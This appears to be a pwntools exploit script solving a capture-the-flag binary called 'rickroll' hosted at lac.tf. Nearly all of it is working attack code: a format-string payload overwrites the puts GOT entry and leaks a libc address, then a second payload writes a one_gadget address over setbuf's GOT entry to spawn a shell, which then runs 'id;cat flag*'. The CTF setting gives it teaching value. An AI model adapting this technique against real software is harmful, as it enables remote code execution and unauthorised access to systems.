#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF("rickroll_patched")
libc = ELF("./libc-2.31.so")

# change -l0 to -l1 for more gadgets
def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l0', filename]).decode().split(' ')]
#onegadgets = one_gadget(libc.path, libc.address)

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)


rop = ROP(exe)

host, port = "lac.tf", "31135"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process([exe.path])

payload = '%39$p%4463c%8$hn'+p64(exe.got['puts'])
sla("Lyrics: ", payload)

libc.address = int(rcu('and ',' '),16)-0x23d0a
onegadgets = one_gadget(libc.path, libc.address)
logbase()

sla('Lyrics: ', fmtstr_payload(7, {exe.got['setbuf']: onegadgets[2]})+"PIPO")

p.sendline('id;cat flag*')

p.interactive()

